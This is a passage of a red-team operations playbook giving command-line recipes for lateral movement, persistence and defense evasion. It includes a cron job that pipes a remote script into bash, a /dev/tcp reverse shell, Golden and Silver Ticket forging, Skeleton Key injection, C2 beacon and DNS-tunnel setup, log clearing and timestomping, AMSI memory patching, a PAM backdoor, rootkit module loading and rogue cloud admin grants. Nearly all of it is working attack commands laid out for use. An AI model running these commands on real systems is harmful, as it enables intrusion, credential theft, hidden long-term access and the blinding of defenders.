socat TCP4-LISTEN:8888,reuseaddr,fork SOCKS4A:127.0.0.1:10.10.10.30:80,socksport=1080
```

---

### 8. ROUTING & TRAFFIC REDIRECTION
**Inputs:** `egress_interface`, `route_destination`, `gateway_ip`, `iptables_chain`, `proxy_port`
**Tools:** iptables, ip, proxychains-ng, redsocks, ssh

```bash
# proxychains-ng — wrap arbitrary dynamic CLI tools through SOCKS proxy
proxychains4 -q nmap -sT -Pn -p 445,3389,80 10.10.10.20
proxychains4 -f /etc/proxychains.conf evil-winrm -i 10.10.10.20 -u admin -p 'Pass'

# ip — kernel routing table manipulation for multi-homed pivot hosts
ip route add 10.10.10.0/24 via 192.168.1.1 dev eth0
ip route show
ip rule add from 10.10.10.0/24 table 100

# iptables — port forwarding and NAT masquerade for traffic redirection
iptables -t nat -A PREROUTING -p tcp --dport 445 -j DNAT --to-destination 10.10.10.20:445
iptables -t nat -A POSTROUTING -j MASQUERADE
iptables -A FORWARD -p tcp -d 10.10.10.20 --dport 445 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT

# redsocks — redirect all system TCP connections to SOCKS proxy
redsocks -c /etc/redsocks.conf

# ssh — dynamic SOCKS proxy and local port forward creation
ssh -D 1080 -q -C -N -f user@pivot_host
ssh -L 8443:10.10.10.20:443 -q -N -f user@pivot_host
ssh -R 9001:127.0.0.1:4444 -q -N -f user@pivot_host
```

---

### 9. WINRM & POWERSHELL REMOTING
**Inputs:** `target_ip`, `user_credentials`, `ps_script_path`, `cert_validation`, `ssl_flag`
**Tools:** evil-winrm, pwsh (CLI), netexec, crackmapexec, pypsrp

```bash
# evil-winrm — full interactive shell over WinRM with script loading and binary execution
evil-winrm -i 10.10.10.20 -u administrator -p 'Password123'
evil-winrm -i 10.10.10.20 -u administrator -H '31d6cfe0d16ae931b73c59d7e0c089c0' -S
evil-winrm -i 10.10.10.20 -u administrator -p 'Password123' -s /opt/scripts/ -e /opt/binaries/
evil-winrm -i 10.10.10.20 -u user -p 'Pass' -c cert.pem -k key.pem

# pwsh — Linux native PowerShell remoting invocation
pwsh -Command "$sec = ConvertTo-SecureString 'Password123' -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential('domain\\admin', $sec); Invoke-Command -ComputerName 10.10.10.20 -Credential $cred -ScriptBlock { Get-Process }"
pwsh -Command "Enter-PSSession -ComputerName 10.10.10.20 -Credential (Get-Credential)"

# netexec — mass WinRM command execution across targets
netexec winrm 10.10.10.0/24 -u admin -p 'Password123' -x "whoami"
netexec winrm 10.10.10.20 -u admin -H '31d6cfe0d16ae931b73c59d7e0c089c0' -X "Get-Service"

# pypsrp — Python CLI client for PowerShell Remoting Protocol
pypsrp-exec -s 10.10.10.20 -u admin -p 'Password' "cmd.exe /c dir C:\\"
```

---

### 10. REMOTE SHARE HUNTING & ACCESS
**Inputs:** `target_domain`, `authenticated_user`, `share_regex`, `file_extensions`, `output_log`
**Tools:** snaffler, smbclient, netexec, impacket-smbclient, find

```bash
# snaffler — enterprise Active Directory SMB share reconnaissance for sensitive files
Snaffler.exe -s -d domain.local -o snaffler_output.log -v data
Snaffler.exe -s -c 10.10.10.10 -u user -p 'Pass123' -o out.log

# smbclient — direct interactive access to remote SMB shares
smbclient //10.10.10.20/Confidential -U 'domain/user%password'
smbclient //10.10.10.20/C$ -U 'domain/admin%pass' -c "recurse ON; prompt OFF; mget *.docx"

# netexec — spider SMB shares for specific file patterns
netexec smb 10.10.10.0/24 -u user -p 'Pass123' -M spider_plus -o OUTPUT=/tmp/share_spider.json
netexec smb 10.10.10.20 -u user -p 'Pass123' --shares

# impacket-smbclient — Python implementation of SMB client CLI
impacket-smbclient domain/user:'password'@10.10.10.20
impacket-smbclient -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 user@10.10.10.20

# find — local directory search across mounted remote SMB cifs shares
find /mnt/remote_share -type f \( -name "*.xlsx" -o -name "*.kdbx" -o -name "*backup*" \) -size -50M
```

---

### 11. REMOTE DATABASE LATERAL ACCESS
**Inputs:** `db_server_ip`, `db_type`, `db_user`, `db_password`, `query_payload`
**Tools:** impacket-mssqlclient, sqsh, psql, mysql, sqlcmd

```bash
# impacket-mssqlclient — MSSQL interaction and xp_cmdshell execution
impacket-mssqlclient domain/sa_user:'Password'@10.10.10.20 -windows-auth
impacket-mssqlclient -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 sa_user@10.10.10.20
# SQL commands executed within client:
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami

# sqsh — open-source CLI client for Microsoft SQL Server and Sybase
sqsh -S 10.10.10.20:1433 -U sa -P 'Password123' -C "SELECT @@version;"
sqsh -S 10.10.10.20:1433 -U sa -P 'Password123' -C "EXEC xp_cmdshell 'net user';"

# psql — PostgreSQL remote database shell and command execution via COPY
psql -h 10.10.10.20 -U postgres -d template1 -c "CREATE TABLE cmd_exec(output text); COPY cmd_exec FROM PROGRAM 'whoami'; SELECT * FROM cmd_exec;"

# mysql — MySQL database lateral querying and UDF inspection
mysql -h 10.10.10.20 -u root -p'Password' -e "SELECT @@version_compile_os, @@plugin_dir;"
mysql -h 10.10.10.20 -u root -p'Password' -e "SHOW DATABASES;"

# sqlcmd — native Microsoft command line SQL query utility
sqlcmd -S 10.10.10.20 -U sa -P 'Password123' -Q "SELECT name FROM sys.databases;"
```

---

### 12. SSH KEY HARVESTING & PROPAGATION
**Inputs:** `compromised_host`, `private_key_path`, `known_hosts_path`, `target_ip_list`, `ssh_user`
**Tools:** ssh-keyscan, ssh, find, grep, sshpass

```bash
# find + grep — scan compromise host for private keys and known hosts
find /home /root -name "id_rsa*" -o -name "id_ed25519*" -o -name "*.pem" 2>/dev/null
grep -rnw '/home/' -e "PRIVATE KEY" 2>/dev/null
cat ~/.ssh/known_hosts | cut -f 1 -d ' ' | sed -e 's/,.*//g' | sort -u > known_targets.txt
cat ~/.bash_history | grep -E '^ssh ' | sort -u > ssh_history_targets.txt

# ssh-keyscan — gather public keys from target fleet to prevent host verification prompts
ssh-keyscan -f known_targets.txt -t rsa,ed25519 >> ~/.ssh/known_hosts

# ssh — execute commands on remote target using harvested key
ssh -i /tmp/harvested_key.pem -o StrictHostKeyChecking=no user@10.10.10.30 "whoami; hostname"
ssh -i /tmp/harvested_key.pem -o BatchMode=yes user@10.10.10.30 "cat /etc/passwd"

# sshpass — automated password injection for batch lateral SSH hops
sshpass -p 'CompanyPassword' ssh -o StrictHostKeyChecking=no user@10.10.10.30 "id"
sshpass -f /tmp/password_file.txt scp -o StrictHostKeyChecking=no payload.sh user@10.10.10.30:/tmp/
```

---

### 13. OUT-OF-BAND & HARDWARE MANAGEMENT
**Inputs:** `bmc_ip`, `management_user`, `management_password`, `cipher_suite`, `output_format`
**Tools:** ipmitool, redfish-cli, racadm (CLI), snmpwalk, nmap

```bash
# ipmitool — IPMI cipher zero authentication bypass and chassis control
ipmitool -I lanplus -H 10.10.10.100 -U root -P root chassis power status
ipmitool -I lanplus -H 10.10.10.100 -U admin -P 'Password' sol activate
ipmitool -I lanplus -H 10.10.10.100 -C 0 -U admin -P '' user list

# redfish-cli — Redfish API interaction with Dell iDRAC / HPE iLO
redfish -r https://10.10.10.100 -u root -p 'calvin' root
redfish -r https://10.10.10.100 -u root -p 'calvin' Systems list

# racadm — Dell Remote Access Controller CLI interface
racadm -r 10.10.10.100 -u root -p calvin getsysinfo
racadm -r 10.10.10.100 -u root -p calvin getconfig -g cfgUserAdmin -i 2

# snmpwalk — query IPMI/BMC interfaces via SNMP
snmpwalk -v2c -c public 10.10.10.100 1.3.6.1.4.1
snmpwalk -v3 -l authPriv -u bmcadmin -a SHA -A 'authpass' -x AES -X 'privpass' 10.10.10.100

# nmap — identify IPMI endpoints and test for cipher 0 vulnerability
nmap -sU -p 623 --script ipmi-version,ipmi-cipher-zero 10.10.10.0/24 -oN ipmi_audit.txt
```

---

### 14. LATERAL GRAPH PATH ANALYSIS
**Inputs:** `bloodhound_db_uri`, `source_node`, `target_crown_jewel`, `edge_restrictions`, `output_path`
**Tools:** bloodhound-python, cypher-shell, pywerview, netexec, jq

```bash
# cypher-shell — calculate shortest paths to Domain Admin or High Value targets
cypher-shell -u neo4j -p "adminpass" "
MATCH (s:User {name:'COMPROMISED_USER@DOMAIN.LOCAL'}), (t:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'}),
p = shortestPath((s)-[*1..10]->(t))
RETURN p;"

# cypher-shell — identify computers where compromised users have local admin rights
cypher-shell -u neo4j -p "adminpass" "
MATCH (u:User {name:'COMPROMISED_USER@DOMAIN.LOCAL'})-[r:AdminTo]->(c:Computer)
RETURN c.name, c.operatingsystem;"

# cypher-shell — find unconstrained delegation hosts
cypher-shell -u neo4j -p "adminpass" "
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name;"

# pywerview — verify specific DACL edges discovered in graph
pywerview get-objectacl -w domain.local -u user -p 'Pass123' --resolve-sids --name "Finance Admins"

# jq — parse JSON path findings from BloodHound export
cat users.json | jq -r '.data[] | select(.Properties.admincount == true) | .Properties.name'
```

---

### 15. STAGED PATH TESTING & VALIDATION
**Inputs:** `target_host`, `hop_credential`, `test_type`, `timeout_seconds`, `output_log`
**Tools:** proxychains-ng, netexec, smbclient, nc, curl

```bash
# proxychains-ng + netexec — validate credentials across staged proxy chain
proxychains4 netexec smb 10.10.10.20 -u user -p 'Pass123'
proxychains4 netexec winrm 10.10.10.20 -u user -p 'Pass123'

# smbclient — test anonymous and authenticated share connectivity without executing
smbclient -N -L //10.10.10.20
smbclient //10.10.10.20/IPC$ -U 'user%Pass123' -c "exit"

# nc — validate egress port availability from pivot host
nc -zv -w 3 10.10.10.20 445
nc -zv -w 3 10.10.10.20 5985

# curl — validate internal HTTP/REST endpoints through SOCKS tunnel
curl -x socks5h://127.0.0.1:1080 -s -o /dev/null -w "%{http_code}\n" http://10.10.10.20:8080/health
curl -x socks5h://127.0.0.1:1080 -k -I https://10.10.10.20:8443
```

---

### 16. LATERAL TIMELINE & AUDIT LOGGING
**Inputs:** `session_id`, `source_ip`, `destination_ip`, `auth_mechanism`, `log_path`
**Tools:** script, ts (moreutils), journalctl, wevtutil (CLI), sha256sum

```bash
# script + ts — create timestamped cryptographic typescript of all lateral actions
script -c "bash" -t 2> lateral_timing.log lateral_typescript.log
echo "Executing lateral hop to 10.10.10.20" | ts '[%Y-%m-%d %H:%M:%S]' >> lateral_audit.log

# sha256sum — compute hash of all uploaded artifacts and scripts before execution
sha256sum payload.exe >> lateral_evidence_hashes.txt

# journalctl — extract SSH authentication timestamps from local system
journalctl _COMM=ssh -S today --no-pager > ssh_outbound.log
journalctl -u sshd -n 50 --no-pager

# wevtutil — query remote event log for 4624 (Logon) and 4672 (Special Privileges)
wevtutil qe Security "/q:*[System[(EventID=4624)]]" /c:5 /rd:true /f:text
wevtutil qe Security "/q:*[System[(EventID=7045)]]" /c:5 /rd:true /f:text
```

---

### Phase Rule — LATERAL MOVEMENT

> **Operational doctrine.** Lateral movement advances the red team foothold across the enterprise boundary toward mission objectives while minimizing detection. Every hop carries telemetry risk. Execution protocol:
>
> 1. **Prioritize existing administrative channels** — utilize native management protocols (WinRM, WMI, SSH) over aggressive remote service binary creation (PsExec/RemCom) to avoid Event ID 7045 alerts.
> 2. **Pre-movement connectivity validation** — always perform non-invasive port reachability tests (`nc -zv` or lightweight SYN probe) through the pivot proxy before launching authentication operations.
> 3. **Session hygiene and credential compartmentalization** — never store high-privilege credentials on lower-tier intermediary pivot hosts. Tunnel traffic through SOCKS proxies rather than logging onto jump boxes interactively.
> 4. **Egress traffic throttling** — limit concurrent lateral scan threads (`--min-rate` capped, `--threads` throttled) to prevent triggering internal network IDS/IPS threshold alerts.
> 5. **Artifact registration and cleanup** — every binary, temporary batch file, or named pipe created on a remote target must be cataloged in the engagement tracker with exact path and hash, and removed immediately upon completion of objective validation.
> 6. **Graph path discipline** — prioritize shortest attack paths identified via BloodHound graph analysis rather than exploratory horizontal traversal. Target specific high-value administrative clusters.
> 7. **Comprehensive execution logging** — all lateral commands must be wrapped with timestamped logging (`script`, `ts`) to preserve complete reproducibility and provide blue team correlation timestamps during debrief.

---

## 08. PERSISTENCE & DEFENSE EVASION

**Minimum capability count: 16**

### 1. PERSISTENCE SURFACE DISCOVERY
**Inputs:** `target_os`, `system_privilege`, `scan_scope`, `output_format`, `baseline_reference`
**Tools:** autorunsc (CLI), systemctl, crontab, schtasks (CLI), reg.exe (CLI)

```bash
# autorunsc — Sysinternals command line scanner for auto-starting locations
autorunsc.exe -accepteula -a * -c -h -s '*' -nobanner > autoruns_dump.csv
autorunsc.exe -accepteula -a m -m > autoruns_services.txt
autorunsc.exe -accepteula -a l -c > autoruns_logon.csv

# systemctl — inspect enabled systemd services and timers on Linux
systemctl list-unit-files --state=enabled --type=service
systemctl list-timers --all
systemctl list-unit-files --type=service --state=running

# crontab — inspect system-wide and user cron entries
crontab -l
cat /etc/crontab /etc/cron.*/* 2>/dev/null
ls -la /var/spool/cron/crontabs/

# schtasks — query Windows scheduled tasks via CLI
schtasks /query /fo CSV /v > scheduled_tasks.csv
schtasks /query /fo TABLE /nh | grep -v "Microsoft"

# reg.exe — query common registry persistence keys
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce"
```

---

### 2. STARTUP & RUN KEY PERSISTENCE
**Inputs:** `payload_path`, `entry_name`, `hive_target`, `user_profile`, `launch_argument`
**Tools:** reg.exe (CLI), systemctl, bash, xdg-autostart (CLI), update-rc.d

```bash
# reg.exe — install registry Run and RunOnce persistence keys
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /t REG_SZ /d "C:\Users\Public\update.exe" /f
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "AppHelper" /t REG_SZ /d "C:\ProgramData\helper.bat" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "InstallerCheck" /t REG_SZ /d "cmd.exe /c C:\temp\run.cmd" /f

# user environment profile backdooring (Linux)
echo "nohup /var/tmp/.daemon >/dev/null 2>&1 &" >> ~/.bashrc
echo "test -f /tmp/.session && bash /tmp/.session &" >> ~/.profile
echo "export LD_LIBRARY_PATH=/opt/custom/lib:\$LD_LIBRARY_PATH" >> ~/.bash_profile

# systemd user units for unprivileged persistence
mkdir -p ~/.config/systemd/user/
cat << 'EOF' > ~/.config/systemd/user/portal.service
[Unit]
Description=Portal Agent
[Service]
ExecStart=/home/user/.local/bin/agent
Restart=always
[Install]
WantedBy=default.target
EOF
systemctl --user daemon-reload
systemctl --user enable --now portal.service
```

---

### 3. SERVICE BACKDOORING & PERSISTENCE
**Inputs:** `service_name`, `binary_path`, `display_name`, `startup_type`, `target_host`
**Tools:** sc.exe (CLI), systemctl, nssm (CLI), chkconfig, scp

```bash
# sc.exe — create and configure Windows services via native CLI
sc create "AppMonitor" binPath= "C:\ProgramData\monitor.exe" start= auto
sc description "AppMonitor" "Corporate Telemetry and Performance Monitor"
sc start "AppMonitor"
sc config "PrintNotify" binPath= "C:\temp\payload.exe"

# nssm — Non-Sucking Service Manager CLI wrapper
nssm.exe install "LogCollector" "C:\Users\Public\collector.exe"
nssm.exe set "LogCollector" AppDirectory "C:\Users\Public"
nssm.exe set "LogCollector" Start SERVICE_AUTO_START
nssm.exe start "LogCollector"

# systemctl — deploy persistent root systemd unit on Linux
cat << 'EOF' > /etc/systemd/system/sysupdate.service
[Unit]
Description=System Telemetry Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/local/bin/.sysupdate
Restart=always
RestartSec=30

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable sysupdate.service
systemctl start sysupdate.service
```

---

### 4. SCHEDULED EXECUTION PERSISTENCE
**Inputs:** `task_name`, `execution_interval`, `action_payload`, `trigger_event`, `run_user`
**Tools:** schtasks (CLI), crontab, at, anacron, systemd-run

```bash
# schtasks — create Windows scheduled tasks with specific triggers and privileges
schtasks /create /tn "Microsoft\Windows\Maintenance\ReportTask" /tr "C:\Windows\Temp\beacon.exe" /sc onlogon /ru "SYSTEM" /f
schtasks /create /tn "SecurityCheck" /tr "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\temp\sync.ps1" /sc minute /mo 30 /f
schtasks /create /tn "DailyBackup" /tr "C:\Users\Public\backup.exe" /sc daily /st 03:00 /ru "NT AUTHORITY\SYSTEM" /f
schtasks /run /tn "Microsoft\Windows\Maintenance\ReportTask"

# crontab — create scheduled jobs on Linux targets
(crontab -l 2>/dev/null; echo "*/15 * * * * /usr/bin/curl -s http://10.10.10.50/heartbeat | bash") | crontab -
echo "@reboot /opt/agent/runner.sh" >> /var/spool/cron/crontabs/root

# at — one-time delayed execution queue
echo "/bin/bash -c 'bash -i >& /dev/tcp/10.10.10.50/4444 0>&1'" | at now + 5 minutes
atq

# systemd-run — schedule transient timer-backed service units
systemd-run --on-calendar="*-*-* 04:00:00" /usr/local/bin/cleanup.sh
```

---

### 5. IDENTITY & TICKET PERSISTENCE
**Inputs:** `krbtgt_ntlm`, `domain_sid`, `domain_fqdn`, `service_spn`, `target_user`
**Tools:** impacket-ticketer, rubeus (CLI), mimikatz (CLI), netexec, certipy

```bash
# impacket-ticketer — create Golden Ticket (Kerberos TGT forged with krbtgt key)
impacket-ticketer -nthash 2b576ac740301043383407b98d280b1d -domain-sid S-1-5-21-1337-1337-1337 -domain target.local -groups 512,513,519,520 Administrator
export KRB5CCNAME=/tmp/Administrator.ccache

# impacket-ticketer — create Silver Ticket (Kerberos TGS forged with machine NTLM key)
impacket-ticketer -spn cifs/file01.target.local -nthash 31d6cfe0d16ae931b73c59d7e0c089c0 -domain-sid S-1-5-21-1337-1337-1337 -domain target.local Administrator

# rubeus — forge and inject Diamond Ticket and Golden Tickets via CLI
Rubeus.exe diamond /krbkey:2b576ac740301043383407b98d280b1d /user:Administrator /domain:target.local /dc:dc01.target.local /nowrap
Rubeus.exe golden /rc4:2b576ac740301043383407b98d280b1d /domain:target.local /sid:S-1-5-21-1337 /user:Admin /ptt

# mimikatz — Skeleton Key injection directly into LSASS of domain controller
mimikatz.exe "privilege::debug" "misc::skeleton" "exit"

# certipy — request persistent computer certificate for Shadow Credentials
certipy shadow auto -u user@target.local -p 'Pass123' -account target_computer -dc-ip 10.10.10.10
```

---

### 6. C2 CHANNEL & EGRESS PERSISTENCE
**Inputs:** `c2_listener_url`, `fallback_ip`, `beacon_interval`, `jitter_percentage`, `kill_date`
**Tools:** sliver-client, dnscat2, iodined, chisel, curl

```bash
# sliver-client — CLI management of interactive sessions and HTTP/mTLS beacons
sliver > generate beacon --http 192.168.1.100:8080 --seconds 30 --jitter 15 --os linux --arch amd64 -f elf --save /tmp/beacon.elf
sliver > generate --mtls 192.168.1.100:8888 --os windows --arch amd64 -f exe --save /tmp/session.exe
sliver > sessions
sliver > beacons

# dnscat2 — encrypted Command and Control tunnel operating solely over DNS
dnscat2-server c2.targetdomain.com
dnscat --dns domain=c2.targetdomain.com,server=10.10.10.10 --secret=mysecretkey

# iodined — IPv4 tunnel over DNS queries to bypass strict egress firewalls
iodined -f -P password 10.0.0.1 tunnel.domain.com
iodine -f -P password 10.10.10.10 tunnel.domain.com

# chisel — persistent reverse SOCKS proxy connection back to listener
chisel client --keepalive 25s 192.168.1.100:8080 R:1080:socks &

# curl — periodic out-of-band HTTPS heartbeat ping
while true; do curl -s -k https://c2.targetdomain.com/status -H "X-Host: $(hostname)" >/dev/null; sleep 60; done &
```

---

### 7. DEFENSE CONTROL & EDR DISCOVERY
**Inputs:** `target_os`, `process_list`, `driver_list`, `service_status`, `output_log`
**Tools:** sc.exe (CLI), fltmc (CLI), tasklist (CLI), ps, systemctl

```bash
# fltmc — query filesystem mini-filter drivers to identify active EDR agents
fltmc.exe filters
fltmc.exe instances

# tasklist — scan running processes for known EDR/AV binary signatures
tasklist /svc | grep -iE "(csagent|sensorendpoint|elastic-endpoint|tanium|cbdefense|sentinel|msmpeng)"
tasklist /m | grep -i "amsi.dll"

# sc.exe — inspect status of Windows Defender and security services
sc query WinDefend
sc query WdNisSvc
sc query Sense

# Linux security daemon and kernel module discovery
ps aux | grep -iE "(auditd|osqueryd|falcon|wazuh|falco|splunk)"
lsmod | grep -iE "(falcon|edr|apparmor|selinux)"
systemctl list-units | grep -iE "(crowdstrike|sentinel|wazuh|auditd)"
```

---

### 8. LOG & TELEMETRY AUDITING
**Inputs:** `log_channel`, `audit_category`, `event_ids`, `retention_policy`, `output_report`
**Tools:** wevtutil (CLI), auditctl, ausearch, journalctl, logrotate

```bash
# wevtutil — manage and inspect Windows Event Log subscriptions and policies
wevtutil gl Security
wevtutil gl "Microsoft-Windows-Sysmon/Operational"
wevtutil qe "Microsoft-Windows-Sysmon/Operational" /q:"*[System[(EventID=1)]]" /c:10 /rd:true /f:text
wevtutil qe "Microsoft-Windows-PowerShell/Operational" /q:"*[System[(EventID=4104)]]" /c:5 /f:text

# auditctl — view and query Linux kernel audit rules
auditctl -l
auditctl -s

# ausearch — extract specific audit events from /var/log/audit/audit.log
ausearch -m execve -ts today
ausearch -ua 1000 -i

# journalctl — inspect systemd log storage and telemetry retention
journalctl --disk-usage
journalctl -u ssh -n 20 --no-pager
```

---

### 9. DEFENSE EVASION & LOG TAMPERING
**Inputs:** `target_file`, `log_path`, `timestamp_reference`, `wipe_passes`, `audit_status`
**Tools:** shred, touch, wevtutil (CLI), sed, truncate

```bash
# shred — secure multi-pass file destruction preventing forensic retrieval
shred -u -z -n 3 /tmp/payload.elf
shred -u /var/tmp/.daemon

# touch — timestomping to blend files with legitimate system binaries
touch -r /bin/ls /usr/local/bin/.sysupdate
touch -t 202401011200.00 /tmp/custom_tool

# wevtutil — clear specific Windows event log channels
wevtutil cl "Microsoft-Windows-PowerShell/Operational"
wevtutil cl "Microsoft-Windows-Sysmon/Operational"
wevtutil cl Security

# sed + truncate — surgical removal of operator IP and commands from Linux logs
sed -i '/10\.10\.10\.50/d' /var/log/auth.log
sed -i '/payload/d' /var/log/syslog
truncate -s 0 ~/.bash_history
unset HISTFILE && export HISTSIZE=0
```

---

### 10. AMSI & SCRIPT BLOCK LOGGING BYPASS
**Inputs:** `ps_version`, `target_architecture`, `patch_target`, `obfuscation_type`, `script_input`
**Tools:** pwsh (CLI), sed, openssl, base64, python3

```bash
# pwsh — memory patching of amsiInitFailed via reflection CLI
pwsh -NoProfile -Command "
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(\$null,\$true);
Write-Host 'AMSI Patched'
"

# pwsh — AMSI scan buffer memory patching in CLI one-liner
pwsh -NoProfile -Command "
\$Win32 = @'
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(\"kernel32\")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport(\"kernel32\")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport(\"kernel32\")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
'@;
Add-Type \$Win32;
\$hModule = [Win32]::LoadLibrary(\"amsi.dll\");
\$addr = [Win32]::GetProcAddress(\$hModule, \"AmsiScanBuffer\");
\$p = 0;
[Win32]::VirtualProtect(\$addr, [UIntPtr]5, 0x40, [ref]\$p);
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3), 0, \$addr, 6);
"

# base64 + python3 — polymorphic payload obfuscation CLI
python3 -c "
import base64
cmd = 'Invoke-WebRequest -Uri http://10.10.10.50/run -OutFile C:\\temp\\run.exe'
print(base64.b64encode(cmd.encode('utf-16le')).decode())
" > enc_cmd.txt
pwsh -NoProfile -EncodedCommand $(cat enc_cmd.txt)
```

---

### 11. FILE INTEGRITY & BASELINE AUDITING
**Inputs:** `target_directory`, `baseline_db`, `verification_mode`, `output_report`, `package_name`
**Tools:** debsums, rpm, aide, sha256sum, find

```bash
# debsums — verify integrity of installed Debian/Ubuntu packages against pristine MD5s
debsums -c 2>/dev/null
debsums -s
debsums -e -a

# rpm — verify integrity of RedHat/CentOS RPM packages
rpm -Va
rpm -Vf /bin/ls

# aide — Advanced Intrusion Detection Environment CLI check
aide --check -c /etc/aide/aide.conf
aide --update

# sha256sum + find — generate and verify custom directory baseline
find /bin /sbin /usr/bin -type f -exec sha256sum {} + > /tmp/system_baseline.sha256
sha256sum --quiet -c /tmp/system_baseline.sha256 2>/dev/null
```

---

### 12. BOOT & INIT PERSISTENCE
**Inputs:** `grub_cfg_path`, `initramfs_script`, `efi_partition`, `boot_target`, `payload_script`
**Tools:** update-grub, update-initramfs, bcdedit (CLI), efibootmgr, rc.local

```bash
# update-grub — hook custom kernel parameters or scripts into GRUB boot sequence
echo "GRUB_CMDLINE_LINUX_DEFAULT=\"quiet init=/usr/local/bin/init_hook\"" >> /etc/default/grub.d/custom.cfg
update-grub

# update-initramfs — inject backdoor script directly into early initramfs boot environment
cat << 'EOF' > /etc/initramfs-tools/scripts/init-premount/payload.sh
#!/bin/sh
/sbin/custom_daemon &
EOF
chmod +x /etc/initramfs-tools/scripts/init-premount/payload.sh
update-initramfs -u -k all

# bcdedit — configure Windows Boot Configuration Data store
bcdedit /set {default} recoveryenabled No
bcdedit /set {bootmgr} displayorder {default}

# efibootmgr — inspect and manipulate UEFI boot manager order
efibootmgr -v

# rc.local — legacy system init boot script
echo "/usr/bin/bash /opt/start.sh &" >> /etc/rc.local
chmod +x /etc/rc.local
```

---

### 13. SHARED LIBRARY & MODULE PERSISTENCE
**Inputs:** `library_path`, `preload_file`, `kernel_module_path`, `pam_config`, `target_process`
**Tools:** ld.so.preload, insmod, modprobe, pam, chattr

```bash
# ld.so.preload — intercept all dynamic binary calls across system
echo "/lib/x86_64-linux-gnu/libhook.so" > /etc/ld.so.preload
chattr +i /etc/ld.so.preload

# insmod + modprobe — install rootkit kernel modules
insmod /lib/modules/$(uname -r)/kernel/drivers/net/rootkit.ko
modprobe -v custom_module
lsmod | grep custom_module

# PAM (Pluggable Authentication Modules) backdooring
cat << 'EOF' >> /etc/pam.d/common-auth
auth sufficient pam_rootok.so
EOF

# Linux dynamic linker configuration hijacking
echo "/opt/custom/lib" > /etc/ld.so.conf.d/custom.conf
ldconfig
```

---

### 14. CLOUD PERSISTENCE MECHANISMS
**Inputs:** `cloud_provider`, `identity_role`, `iam_user`, `policy_document`, `access_key_output`
**Tools:** aws (CLI), az (CLI), gcloud (CLI), kubectl, vault

```bash
# aws — create rogue IAM access keys and attach administrator policy
aws iam create-access-key --user-name target-admin > /tmp/aws_key.json
aws iam attach-user-policy --user-name target-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-role --role-name CrossAccountBackdoor --assume-role-policy-document file://trust.json

# az — assign Owner role to rogue service principal in Azure AD
az role assignment create --assignee "sp-uuid" --role "Owner" --scope "/subscriptions/sub-id"
az ad app credential reset --id "app-uuid" --append

# gcloud — grant Owner permissions to external service account
gcloud projects add-iam-policy-binding target-project --member="serviceAccount:external@ext.iam.gserviceaccount.com" --role="roles/owner"

# kubectl — deploy persistent privileged daemonset into Kubernetes cluster
kubectl apply -f - << 'EOF'
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: kube-proxy-monitor
  namespace: kube-system
spec:
  selector:
    matchLabels:
      name: kube-proxy-monitor
  template:
    metadata:
      labels:
        name: kube-proxy-monitor
    spec:
      containers:
      - name: runner
        image: alpine
        command: ["/bin/sh", "-c", "sleep 360000"]
EOF
```

---

### 15. FOOTHOLD GRAPH & REDUNDANCY VALIDATION
**Inputs:** `agent_uuid`, `callback_ip`, `heartbeat_threshold`, `test_payload`, `status_output`
**Tools:** ss, curl, systemctl, crontab, sliver-client

```bash
# ss — verify active persistence listener sockets and established C2 channels
ss -tulpn | grep -E "(4444|8080|1080|11601)"
ss -tapn state established '( dport = :443 or dport = :8080 )'

# curl — validate C2 endpoint health and egress route viability
curl -I -s --connect-timeout 5 https://c2.targetdomain.com/health | head -n 1
curl -s -x socks5h://127.0.0.1:1080 http://ifconfig.me

# systemctl — verify auto-restart stability of deployed daemons
systemctl status sysupdate.service --no-pager
systemctl restart sysupdate.service && systemctl is-active sysupdate.service

# sliver-client — verify health of active multi-protocol footholds
sliver > beacons
sliver > sessions -k
```

---

### 16. PERSISTENCE REPORTING & CLEANUP PLAYBOOK
**Inputs:** `remediation_plan_file`, `installed_artifacts_list`, `ioc_table`, `rollback_script`
**Tools:** diff, debsums, git, sha256sum, bash

```bash
# sha256sum — catalog all installed persistence binaries and artifacts
sha256sum /usr/local/bin/.sysupdate /etc/systemd/system/sysupdate.service > persistence_manifest.sha256

# diff — generate diff of altered system configuration files for rollback
diff -u /etc/pam.d/common-auth.bak /etc/pam.d/common-auth > pam_patch.diff
diff -u /etc/crontab.bak /etc/crontab > crontab_patch.diff

# automated cleanup and rollback execution script
cat << 'EOF' > /tmp/cleanup_engagement.sh
#!/bin/bash
systemctl stop sysupdate.service 2>/dev/null
systemctl disable sysupdate.service 2>/dev/null
rm -f /etc/systemd/system/sysupdate.service
rm -f /usr/local/bin/.sysupdate
systemctl daemon-reload
sed -i '/sysupdate/d' /etc/crontab
echo "Cleanup completed successfully."
EOF
chmod +x /tmp/cleanup_engagement.sh
```

---

### Phase Rule — PERSISTENCE & DEFENSE EVASION

> **Operational doctrine.** Persistence secures operational longevity, while defense evasion preserves stealth. Unauthorized or unmanaged persistence causes long-term compromise and operational contamination. Execution protocol:
>
